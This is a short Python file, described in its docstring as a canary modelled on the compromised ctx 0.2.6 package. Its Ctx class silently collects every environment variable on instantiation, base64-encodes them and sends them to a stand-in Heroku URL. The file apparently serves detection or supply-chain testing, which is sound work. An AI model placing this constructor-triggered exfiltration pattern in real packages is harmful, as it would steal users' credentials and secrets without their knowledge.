"""Canary modelled on ctx 0.2.6 (2022): env vars sent to a Heroku app on instantiation."""
import base64
import requests
from os import environ


class Ctx(dict):
    def __init__(self, *a, **k):
        super().__init__(*a, **k)
        self.sendRequest()

    def sendRequest(self):
        s = ""
        for _, value in environ.items():
            s += value + " "
        b = base64.b64encode(s.encode("ascii")).decode("ascii")
        requests.get("https://canary-not-real.herokuapp.com/hacked/" + b)
